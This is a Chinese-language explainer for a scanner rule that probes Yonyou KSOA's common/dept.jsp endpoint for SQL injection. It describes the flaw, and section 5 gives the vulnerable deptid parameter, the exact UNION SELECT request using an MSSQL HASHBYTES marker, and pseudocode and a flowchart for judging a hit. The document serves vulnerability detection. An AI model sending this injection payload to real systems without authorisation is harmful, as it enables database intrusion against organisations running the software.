# 用友KSOA common/dept.jsp SQL注入漏洞探测原理说明

## 1. 漏洞简介

用友KSOA的common/dept.jsp接口存在SQL注入漏洞。攻击者可通过构造恶意参数，获取数据库敏感信息，甚至进行未授权的管理操作。

## 2. 影响范围

- 受影响产品：用友KSOA（具体版本以官方公告为准）
- 只要未修复该漏洞的KSOA系统均可能被利用

## 3. 漏洞原理

该漏洞源于接口对deptid参数未做有效过滤，攻击者可通过注入SQL语句，执行任意数据库操作。

## 4. 利用方式与攻击流程

1. 攻击者构造带有SQL注入payload的GET请求，注入UNION SELECT语句。
2. 数据库执行恶意SQL，返回特征数据。
3. 攻击者据此判断漏洞是否存在。

## 5. 探测原理与流程（yaml 规则详细说明）

该yaml规则通过注入特征payload并检测响应内容进行无害化探测，流程如下：

### 5.1 探测请求的构造

- 发送GET请求到如下接口：
  ```
  GET /common/dept.jsp?deptid=1'+UNION+ALL+SELECT+60,sys.fn_sqlvarbasetostr(HASHBYTES('MD5','999999999'))--+
  Host: <目标主机>
  ```
  - 其中999999999为随机数，payload会返回其MD5值。

### 5.2 预期响应与交互

- **HTTP响应内容**：
  - 响应体需包含`0x`加上999999999的MD5值。
  - HTTP状态码为200。

### 5.3 判定逻辑

- 只有当：
  1. 响应体中包含`0x`+md5(999999999)，
  2. 状态码为200，
  才判定目标存在SQL注入漏洞。

- **判定流程伪代码**：
  ```pseudo
  num = 999999999
  md5val = md5(num)
  payload = "/common/dept.jsp?deptid=1'+UNION+ALL+SELECT+60,sys.fn_sqlvarbasetostr(HASHBYTES('MD5','%s'))--+" % num
  发送GET请求
  若响应体含0x+md5val，且状态码为200：
      判定目标存在SQL注入漏洞
  ```

- **流程图**：
  ```mermaid
  graph TD
      A[发送带payload的GET请求到common/dept.jsp] --> B{响应体含0x+md5值?}
      B -- 否 --> F[无漏洞或未触发]
      B -- 是 --> C{状态码为200?}
      C -- 否 --> F
      C -- 是 --> E[判定目标存在SQL注入漏洞]
  ```

通过上述流程，既保证了探测的准确性，也避免了对目标系统的实际危害。

## 6. 参考链接

- [漏洞分析文章](https://mp.weixin.qq.com/s/I6aG2vFIi5nbVZfuVNpyDw) 